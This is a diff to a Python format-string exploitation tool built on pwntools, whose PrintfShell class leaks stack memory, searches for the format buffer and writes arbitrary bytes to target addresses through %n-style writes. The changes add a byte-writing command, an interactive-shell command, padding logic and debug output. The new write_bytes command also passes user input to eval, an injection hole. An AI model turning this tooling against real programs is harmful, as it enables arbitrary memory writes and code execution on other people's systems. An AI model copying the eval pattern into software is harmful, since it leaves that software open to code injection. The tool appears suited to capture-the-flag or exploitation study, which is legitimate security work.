@@ -12,13 +12,22 @@ class NoConnectionException(Exception):
     pass
 
 class PrintfShell(shell.Shell):
-    def __init__(self, read, write, marker=b"$ ", conn=None, initial_marker=None, prefix_response=None):
+    def __init__(self,
+                read, write,
+                marker=b"$ ",
+                conn=None,
+                initial_marker=None,
+                prefix_response=None,
+                minlength=1):
         shell.Shell.__init__(self)
         self.read = read
         self.write = write
         self.conn = conn
         self.initial_marker = initial_marker
         self.marker = marker
+        # minlength is the length when the %{n}d format string starts working
+        # 0 always requires special handling, so minlength needs to be at least 1
+        self.minlength = minlength 
         if initial_marker == None:
             self.initial_marker = self.marker
         self.prefix = prefix_response
@@ -110,6 +119,10 @@ class PrintfShell(shell.Shell):
         return s + pad
 
     @Command
+    def interact(self):
+        self.conn.interactive() 
+
+    @Command
     def find_memory_location(self):
         if self.stack_offset is None:
             print("Need to set stack offset") # TODO: guess actual value : guess stack base
@@ -119,11 +132,13 @@ class PrintfShell(shell.Shell):
             return
         watchword = pwnlib.util.packing.p64(0xdeadbeefdeadbeef)
         start = self.stack_base
-        for i in range(0, 4096,8):
+        print(f"Start looking at {hex(start)}")
+        for i in range(8, 4096,8):
             command = bytes(f"%{self.stack_offset+1}$s", "ascii")
             command = self.pad(command, 8, b"\x00")
             command += pwnlib.util.packing.p64(start - i)
             command += watchword
+            print(f"sending {command}")
             res = self.read_response(command)
             if res == watchword + b"\n":
                 self.format_location = start - i - 2*8
@@ -137,14 +152,28 @@ class PrintfShell(shell.Shell):
             addr = int(addr, 16)
         n = int(n)
         addr = pwnlib.util.packing.p64(addr)
-        if n != 0:
+        print("Writing", n, "to", hex(pwnlib.util.packing.u64(addr)))
+        if n >= self.minlength:
             command = bytes(f"%{n}d%{self.stack_offset+2}$hhn\x00", "ascii")
         else:
-            command = bytes(f"%{self.stack_offset+2}$hhn\x00", "ascii")
+            # 0 needs to be special, but somtimes the value of the default
+            # n register is longer than 1 character when rendered, so we
+            # just pad in this case.
+            # TODO: handle pad buffer spill over.
+            command = bytes(" "*n+f"%{self.stack_offset+2}$hhn\x00", "ascii")
         command = self.pad(command, 16, b"\x00")
         command += addr
         print(command)
         self.read_response(command) # don't really need to read it beyond housecleaning
+
+    @Command
+    def write_bytes(self, addr : int, bs : list):
+        if type(addr) == str or type(addr) == bytes:
+            addr = int(addr, 16)
+        bs = eval(f"b'{bs}'")
+        print("Writing", bs)
+        for i, b in enumerate(bs):
+            self.write_byte(addr+i, b)
 
     @Command
     def write_n_bytes(self, addr : int, bs : list):
@@ -153,6 +182,7 @@ class PrintfShell(shell.Shell):
         count = 0
         total = 2*len(bs)
         command = bytes("", 'ascii')
+        print(bs)
         for i, n in enumerate(bs):
             spill = (n - count) % 256
             if spill != 0:
